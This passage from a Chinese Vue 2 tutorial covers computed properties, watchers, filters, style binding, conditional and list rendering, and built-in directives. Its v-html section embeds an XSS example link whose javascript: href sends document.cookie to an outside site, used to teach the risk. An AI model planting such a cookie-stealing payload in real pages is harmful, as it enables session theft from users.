        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                const vm = new Vue({
                        el: '#root',
                        data: {
                            firstName: '张',
                            lastName: '三'
                        },
                        computed: {
                            fullName: {
                                // get的作用是：当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                                /* 
                                get调用的情况：
                                    1.初次读取fullName时，get被调用；
                                    2.所依赖的数据发生变化时。
                                */
                                get() {
                                    console.log('get被调用了');
                                    // 此处的this也是vm对象
                                    return this.firstName + '-' + this.lastName;
                                },
                                //set什么时候调用? 当fullName被修改时。
                                set(value){
                                    console.log('set',value)
                                    const arr = value.split('-')
                                    this.firstName = arr[0]
                                    this.lastName = arr[1]
                                }
                            }
                        }
                })
        </script>
</body>
</html>
```

**总结：**

```txt
计算属性：
1.定义：要用的属性不存在，要通过已有属性计算得来。
2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
3.get函数什么时候执行？
	 	(1).初次读取时会执行一次。
		(2).当依赖的数据发生改变时会被再次调用。
4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5.备注：
		1.计算属性最终会出现在vm上，直接读取使用即可。
		2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
```

- **计算属性的简写形式：**以上方式是通过`get()`和`set()`两个方法来实现读取和修改的，但一般情况下，我们用到读取的情况比较多，所以`set()`方法用到的情况就要少一些，就可以省略set方法，并且将`fullName()`作为一个函数对象来获取，这种方式在写法上要灵活和简便一些，因为**计算属性最终会出现在vm上，直接读取即可使用**。vue中简写成如下形式，其它不变：

```vue
new Vue({
    el:'#root', 
    data:{ 
        firstName:'张',
        lastName:'三'
    },
    computed:{
    	fullName(){
		    return this.firstName + '-' + this.lastName
    	}
    }
})
```

**注意：只考虑读取，不考虑修改时才能使用简写形式。**

计算属性案例：

​	 在页面当中使用表达式会非常的遍历，但如果逻辑太多反而会使得模板更加难以维护，下面来一个简单的例子感受一下，会发现在 {{}} 中编写的内容较多，这么写并没有问题，如果写一些比较简单的逻辑较好，多了会导致模板过重，不利于维护；

​	那么Computed就是解决这种问题的，对于任何复杂逻辑，你都应当使用**计算属性；**

![image-20230322215212853](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202303222152025.png)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- {{msg.toUpperCase()+' / '+msg.substring(8,22).toUpperCase()}} -->
            {{msgComputed}}
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            msg:'what do you want to be?'
                        },
                        computed:{
                            msgComputed() {
                                return this.msg.toUpperCase()+' / '+ this.msg.substring(8,22).toUpperCase()
                            }
                        }
                        
                })
        </script>
</body>
</html>
```



### 2.6.监视属性

​	天气案例：实现页面天气`凉爽`和`炎热`的切换，并且在控制台显示`现在`和`原来`的天气情况。我们可以通过Vue的监视属性来实现这一功能。vm对象的`$watch()`或`watch`配置来监视指定的属性，当属性发生变化时，回调函数自动执行，在函数内部进行计算。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627909.png" alt="image-20230115215142948" style="zoom: 50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- <h3>今天天气很{{isHot ? '凉爽' : '炎热'}}</h3> -->
            <h3>今天天气很{{info}}, {{x}}</h3>
            <button @click="changeWeather">切换</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            isHot: true,
                            x: 1
                        },
                        computed: {
                            info() {
                                return this.isHot ? '凉爽' : '炎热';
                            }
                        },
                        methods: {
                            changeWeather() {
                                this.isHot = !this.isHot;
                                this.x++
                            }
                        },
                        
                        
                })
        </script>
</body>
</html>
```

#### 2.6.1.监视属性的基本用法

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- <h3>今天天气很{{isHot ? '凉爽' : '炎热'}}</h3> -->
            <h3>今天天气很{{info}}, {{x}}</h3>
            <button @click="changeWeather">切换</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            isHot: true,
                            x: 1
                        },
                        computed: {
                            info() {
                                return this.isHot ? '凉爽' : '炎热';
                            }
                        },
                        methods: {
                            changeWeather() {
                                this.isHot = !this.isHot;
                                this.x++
                            }
                        },
                        // watch: {
                        //     // isHot就是要监视的属性
                        //     isHot: {
                        //         // immediate表示立即执行，默认为false
                        //         immediate:true, //初始化时让handler调用一下
                        //         // handler()函数是在isHot属性发生变化时执行
                        //         // newValue,oldValue表示修改前后的值
                        //         handler(newValue,oldValue) {
                        //             console.log('isHot发生了改变',newValue,oldValue);
                        //         }
                        //     }
                        // }
                        
                })
                // watch监听方式还可以用以下vm/.$watch()
                // 两个参数分别为要监视的对象和配置对象
                vm.$watch('isHot',{
                    immediate:true, //初始化时让handler调用一下
                    handler(newValue,oldValue) {
                        console.log('isHot发生了改变',newValue,oldValue);
                    }
                })
        </script>
</body>
</html>
```

**总结：**

```txt
监视属性watch：
   1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
   2.监视的属性必须存在，才能进行监视！！
   3.监视的两种写法：
         (1).new Vue时传入watch配置
         (2).通过vm.$watch监视
```

**简写:**当使用`watch`时`isHot`属性内部只有`handler`时，可以简写成以下形式：

```vue
1.使用watch时：
isHot(newValue,oldValue) {
     console.log('isHot发生了改变',newValue,oldValue);
},

2.使用$watch()时：
vm.$watch('isHot',function(newValue,oldValue) {
                        console.log('isHot发生了改变',newValue,oldValue);
                    })
```

#### 2.6.2.深度监视

​	Vue中的watch默认不监视对象内部值得改变（只能监视一层），而要想监视对象内部值（多层）的变化，则需要用到深度监视。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- <h3>今天天气很{{isHot ? '凉爽' : '炎热'}}</h3> -->
            <h3>今天天气很{{info}}</h3>
            <button @click="changeWeather">切换</button>
            <hr>
            <!-- 需求：通过numbers属性任何一个值的改变，输出语句 -->
            <h3>a的值是：{{numbers.a}}</h3>
            <button @click="numbers.a++">点我让a加1</button>
            
            <h3>b的值是：{{numbers.b}}</h3>
            <button @click="numbers.b++">点我让b加1</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            isHot: true,
                            numbers: {
                                a: 1,
                                b: 1
                            }
                        },
                        computed: {
                            info() {
                                return this.isHot ? '凉爽' : '炎热';
                            }
                        },
                        methods: {
                            changeWeather() {
                                this.isHot = !this.isHot;
                                this.x++
                            }
                        },
                        watch: {
                            // isHot就是要监视的属性
                            isHot: {
                                // immediate表示立即执行，默认为false
                                immediate:true, //初始化时让handler调用一下
                                // handler()函数是在isHot属性发生变化时执行
                                // newValue,oldValue表示修改前后的值
                                handler(newValue,oldValue) {
                                    console.log('isHot发生了改变',newValue,oldValue);
                                }
                            },
                            // 监测多级结构中某个属性的用法
                            // 'numbers.a': {
                            //     handler() {
                            //         console.log('a的值改变了。');
                            //     }
                            // },
                            // 监测多级结构中所有属性的用法
                            numbers: {
                                // deep:true表示开启深度监测，默认为false
                                deep: true,
                                handler() {
                                    console.log('numbers的值改变了！');
                                }
                            }
                        }
                        
                })
                
        </script>
</body>
</html>
```

**总结：**

```vue
深度监视：
      (1).Vue中的watch默认不监测对象内部值的改变（一层）。
      (2).配置deep:true可以监测对象内部值改变（多层）。
备注：
      (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
      (2).使用watch时根据数据的具体结构，决定是否采用深度监视。
```

#### 2.6.3.watch  VS computed

​	计算属性和监听属性的对比可根据官网`https://v2.cn.vuejs.org/v2/guide/computed.html#%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7-vs-%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7`的对比进行阅读，我们把之前用**计算属性做的姓名案例**改成监听属性：

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            姓: <input type="text" v-model="firstName"><br/><br/>
            名：<input type="text" v-model="lastName"><br/><br/>
            <!-- 此处虽然有多个fullName，但get只被调用一次，因为当第一次读取fullName时会保存缓存 -->
            姓名：<span>{{fullName}}</span> 
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                const vm = new Vue({
                        el: '#root',
                        data: {
                            firstName: '张',
                            lastName: '三',
                            fullName: '张-三'
                        },
                        watch: {
                            firstName(newValue) {
                                /* 
                                    定时器：修改后等1秒钟再反馈到页面
                                    这是watch监听属性才可以完成的异步操作，
                                    计算属性computed无法完成进行异步操作
                                */
                                setTimeout(() => {
                                    this.fullName = newValue + '-' + this.lastName;
                                }, 1000);
                            },
                            lastName(newValue) {
                                this.fullName = this.firstName+ '-' + newValue ;
                            }
                        }
                })
        </script>
</body>
</html>
```

**总结：**

```txt
computed和watch之间的区别：
      1.computed能完成的功能，watch都可以完成。
      2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
两个重要的小原则：
         1.所有被Vue管理的函数，最好写成普通函数，不写成箭头函数，这样this的指向才是vm 或 组件实例对象。
         2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
           这样this的指向才是vm 或 组件实例对象。
```



### 2.7.过滤器

​	`filters`过滤器可以用来对数据进行格式化，比如字符串首字母转大写、日期格式化等。如下案例：在插值语法中使用过滤器实现小写转大写。

![image-20231213221722501](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312132220119.png)

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>{{msg | toUpper}}</div>
    </div>
    <script>
        var vm = new Vue({
            el: "#root",
            data: {
                msg: "helloworld"
            },
            filters: {
                toUpper(val) {
                    return val ? val.toUpperCase() : ''
                }
            }
        })
    </script>
</body>
</html>
```

**总结：**

```vue
过滤器：
   定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
   语法：
         1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
         2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
   备注：
         1.过滤器也可以接收额外参数、多个过滤器也可以串联
         2.并没有改变原本的数据, 是产生新的对应的数据
```

### 2.7.样式绑定

​	Vue提供的样式绑定有两种：绑定行内（内联）样式和绑定样式类名。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <style>
        .basic{
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        
        .happy{
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            /* 背景渐变，30度渐变轴，从yellow变到yellow */
            background: linear-gradient(30deg,yellow,pink,orange,yellow);
        }
        .sad{
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal{
            background-color: skyblue;
        }

        .z1{
            background-color: yellowgreen;
        }
        .z2{
            font-size: 30px;
            text-shadow:2px 2px 10px red;
        }
        .z3{
            border-radius: 20px;
        }
    </style>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 需求1：基础样式basic和normal，点击切换成happy属性 
                 绑定class样式(字符串写法)，通过 :class='xx',把xx配置到data属性中
                 使用场景：样式类名不确定，需要动态指定
            -->

            <h3 class="basic" :class="mood" @click='changeMood01'>{{name}}</h3><br><br>
            
            <!-- 需求2：基础样式basic，z1,z2,z3两两随机组合 
                 绑定class样式(数组写法)，通过添加数组属性进行设置
                 适用场景：要绑定的样式个数不确定、名字也不确定
            -->
            <h3 class="basic" :class="classArr">{{name}}</h3><br><br>

            <!-- 需求3基础样式basic，z1和z2任意组合，也可以全有，也可以全没有
                 绑定class样式(对象写法)，将确定的类名配置到对象中
                 使用场景：要绑定的样式个数确定、名字确定，但要动态决定用不用
            -->
            <h3 class="basic" :class="classObj">{{name}}</h3><br><br>

            <!-- 
                需求4：给字体添加大小属性
                绑定style样式(对象写法)
                css样式再vue中除第以个单词外，其他单词首字母大写
             -->
            <h3 class="basic" :class="styleObj01">{{name}}</h3><br><br>
            
            <!-- 绑定style样式(数组写法):数组里嵌套对象写法 -->
            <h3 class="basic" :class="[styleObj01, styleObj02]">{{name}}</h3><br><br>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            name: '四川城市职业学院',
                            mood: 'normal',
                            classArr: ['z1', 'z2', 'z3'],
                            classObj: {
                                z1: false,
                                z2: false
                            },
                            styleObj01: {
                                fontSize: '50px',
                                color: 'red'
                            },
                            styleObj01: {
                                backgroundColor: 'blue'
                            }
                        },
                        methods: {
                            changeMood01() {
                                // document.getElementById('demo').className = 'basic happy';
                                // this.mood = 'happy';
                                // 以上方式不够灵活，如果需要点击随机切换normal,happy,sad，则需要用到Math
                                const arr = ['normal', 'happy', 'sad'];
                                // Math.random()随机生成0-1(不包含1),乘以3再向下取整 
                                const index = Math.floor(Math.random() * 3);
                                this.mood = arr[index];
                            },
                        },
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
绑定样式：
      1. class样式
               写法:class="xxx" xxx可以是字符串、对象、数组。
                     字符串写法适用于：类名不确定，要动态获取。
                     对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
                     数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
      2. style样式
               :style="{fontSize: xxx}"其中xxx是动态值。
               :style="[a,b]"其中a、b是样式对象。
```



### 2.8.条件渲染

​	在vue中的条件判断`v-if`和我们之前学习原生JavaScript的`if`语句有很大区别，但仍有单分支，多分支。除此之外，vue也可以使用`v-show`来进行条件判断。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h3>当前n的值是：{{n}}</h3>
            <button @click="n++">点我n加1</button>
            <!-- 
                需求：让h3切换显示或隐藏，可用指令v-show
                v-show可做条件渲染，值可以时true,false或表达式
                v-show底层通过display属性操作
             -->
            <!-- <h3 v-show="false">欢迎来到{{name}}</h3> -->
            <!-- <h3 v-show="1 === 2">欢迎来到{{name}}</h3> -->

            <!-- v-if指令底层通过注释代码结构完成 -->
            <h3 v-if="false">欢迎来到{{name}}</h3>
            <h3 v-if="1 === 1">欢迎来到{{name}}</h3>

            <!-- 不同n的值显示不同的框架
                v-if,v-else-if,v-else是一组指令，中间
                不允许打断（如下面的34行），用法和js中的if-else if- else
                相同
                需要注意的是v-else指令不添加条件
            -->
            <div v-if="n === 1">Angular</div>
            <div v-else-if="n === 2">React</div>
            <!-- <div>打断</div> -->
            <div v-else-if="n === 3">Vue</div>
            <div v-else>Other JS Framework</div>

            <!-- 
                template表示模板，与div包裹不同，div仍在页面保留结构
                而template不影响页面原有结构，可和v-if使用，不能和v-show使用
             -->
            <template v-if="n === 1">
                <h3 >成都</h3>
                <h3 >重庆</h3>
                <h3 >西安</h3>
            </template>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            name: '四川城市职业学院',
                            n: 0
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
条件渲染：
     1.v-if
                  写法：
                        (1).v-if="表达式" 
                        (2).v-else-if="表达式"
                        (3).v-else="表达式"
                  适用于：切换频率较低的场景。
                  特点：不展示的DOM元素直接被移除。
                  注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

     2.v-show
                  写法：v-show="表达式"
                  适用于：切换频率较高的场景。
                  特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
            
     3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
```



### 2.9.列表渲染

#### 2.9.1.基本列表

需求：要实现的页面效果:

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627910.png" alt="image-20230117222210319" style="zoom:50%;" />

​	要实现以上页面效果，正常情况下需要三对`<li>`标签，但在vue中，我们可以直接使用`v-for`指令遍历出`data`中需要的数据就可以了，和`v-for`指令配合使用的是`key`属性，`key`属性表示唯一的标识。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 1.v-for遍历数组 -->
            <h3>人员列表</h3>
            <ul>
                <!-- v-for指令表示遍历，必须和属性key配合使用
                     :key表示让每个li都有唯一一个表示 -->
                <!-- <li v-for="p in persons" :key="p.id"> -->
                <!-- 以上方式还可以写成如下，因v-for可以遍历多个数据 -->
                <li v-for="(p,index) in persons" :key="index">
                    {{p.name}}-{{p.age}}
                </li>
            </ul>

            <!-- 2.v-for遍历对象 -->
            <h3>房屋信息</h3>
            <ul>
                <li v-for="(val, k) in house" :key="k">
                    {{k}}--{{val}}
                </li>
            </ul>

            <!-- 3.v-for遍历字符串 -->
            <h3>字符串信息</h3>
            <ul>
                <li v-for="(char, i) in str" :key="i">
                    {{i}}-{{char}}
                </li>
            </ul>

            <!-- 4.v-for遍历指定次数 -->
            <h3>指定次数</h3>
            <ul>
                <li v-for="(number, index) in 5" :key="index">
                    {{index}}-{{number}}
                </li>
            </ul>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            persons: [
                                {id:'001',name:'张三',age:18},
                                {id:'002',name:'李四',age:19},
                                {id:'003',name:'王五',age:20}
                            ],
                            house: {
                                name: '汤臣一品',
                                price: '100000000元',
                                size: '500平'
                            },
                            str: 'hello vue'
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```vue
v-for指令:
      1.用于展示列表数据
      2.语法：v-for="(item, index) in xxx" :key="yyy"
      3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
```

#### 2.9.2.key的作用与原理

关于`key`属性的官方API介绍可以参照https://v2.cn.vuejs.org/v2/api/#key

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>vue使用模板</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h3>人员列表（遍历数组）</h3>
			<button @click.once="add">添加一个老6</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
                <!-- <li v-for="(p,index) of persons" :key="p.id"> -->
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老6',age:30}
						this.persons.unshift(p)
					}
				},
			})
		</script>
</html>
```

**原理：**

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627911.png" alt="image-20230130205312833" style="zoom:50%;" />

**总结：**

```txt
面试题：react、vue中的key有什么作用？（key的内部原理）     
      1. 虚拟DOM中key的作用：
                  key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
                  随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：            
      2.对比规则：
               (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
                        ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
                        ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
               (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
                        创建新的真实DOM，随后渲染到到页面。                     
      3. 用index作为key可能会引发的问题：
                     1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
                                 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
                     2. 如果结构中还包含输入类的DOM：
                                 会产生错误DOM更新 ==> 界面有问题。
      4. 开发中如何选择key?:
                     1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
                     2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
                        使用index作为key是没有问题的。
```



### 2.10.内置指令

​	之前我们已经学习了`v-bind,v-on,v-if`等指令，除此之外，Vue的作者还给我们定义了许多其他指令。

```txt
v-bind	: 单向绑定解析表达式, 可简写为 :xxx
v-model	: 双向数据绑定
v-for  	: 遍历数组/对象/字符串
v-on   	: 绑定事件监听, 可简写为@
v-if 	: 条件渲染（动态控制节点是否存存在）
v-else 	: 条件渲染（动态控制节点是否存存在）
v-show 	: 条件渲染 (动态控制节点是否展示)
```

#### 2.10.1.v-text指令

​	`v-text`指令的作用是向其所在的结点渲染文本内容。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h3>你好，{{msg}}</h3>
            <h3 v-text="msg"></h3>
            <!-- 不能解析标签 -->
            <h3 v-text="str"></h3>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            msg:'Micheal',
                            str:'<h3>你好！！</h3>'
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
v-text指令：
      1.作用：向其所在的节点中渲染文本内容。
      2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
```

#### 2.10.2.v-html指令

​	与`v-text`不同，`v-html`支持标签结构的解析。但它存在一定的安全隐患。以下面页面为例：由于不是一个登录网页，我们可以打开网页，然后再开发者工具中打开应用，点击编辑输入`cookie`：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627927.png" alt="image-20230202105729169" style="zoom:33%;" />

​	然后点击超链接（str2由标签包裹，并发送?传参），这时我们可以发现超链接会发现百度携带了我们在该网页输入的`cookie`值：

![image-20230202105924234](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627928.png)

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'四川城市职业学院',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

**总结：**

```txt
v-html指令：
      1.作用：向指定节点中渲染包含html结构的内容。
      2.与插值语法的区别：
               (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
               (2).v-html可以识别html结构。
      3.严重注意：v-html有安全性问题！！！！
               (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
               (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
```



#### 2.10.3.v-once指令

​	`v-once`指令是将网页在初次渲染后，就视为静态内容了，并不再改变。以下图为例：我们有一个初始值`n`为1，点击按钮`n+1`，但初始值不改变：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627929.png" alt="image-20230202113409928" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h3 v-once>初始化n的值为：{{n}}</h3>
            <h3>点击后n的值为：{{n}}</h3>
            <button @click="n++">点击n+1</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            n:1
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
v-once指令：
         1.v-once所在节点在初次动态渲染后，就视为静态内容了。
         2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
```

#### 2.10.4.v-pre指令

​	`v-pre`可以跳过结点的渲染过程，Vue不去解析，直接拿过来用。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h3  v-pre>Vue好用，好学</h3>
            <h3 v-pre>点击后n的值为：{{n}}</h3>
            <button v-pre @click="n++">点击n+1</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            n:1
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
v-pre指令：
      1.跳过其所在节点的编译过程。
      2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
```



#### 2.10.5.学生列表案例

​	案例需求：点击添加学生，默认添加一个名为“张三”的学生，点击**删除学生**，默认删除最后一个学生：

![image-20230309203707765](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202303092142003.png)

```vue
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Vue使用模板</title>
  <script src="../js/vue.js"></script>
</head>
<body>
  <div id="root">
    <button @click="add">添加学生</button>
    <button @click="del">删除学生</button>
    <table border="1" width="50%" style="border-collapse: collapse">
      <tr>
        <th>班级</th>
        <th>姓名</th>
        <th>性别</th>
        <th>年龄</th>
      </tr>
      <tr align="center" v-for="item in students">
        <td>{{item.grade}}</td>
        <td>{{item.name}}</td>
        <td>{{item.gender}}</td>
        <td>{{item.age}}</td>
      </tr>
    </table>
  </div>
  <script>
    var vm = new Vue({
      el: '#root',
      data: {
        students: []
      },
      methods: {
        // 添加学生信息
        add () {
          var student = {grade: '1', name: '张三', gender: '男', age: 25}
          this.students.push(student)
        },
        // 删除学生信息
        del () {
          this.students.pop()
        }
      }
    })
  </script>
</body>
</html>
```

### 2.11.自定义指令

​	除了Vue的作者给我们创建的内置指令外，我们也可以自己定义一些指令来完成特定的功能。自定义指令的指令名可以根据功能来自定义，如按以下两个需求来定义指令：

```txt
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。  -- 函数式
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。  -- 对象式
```

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
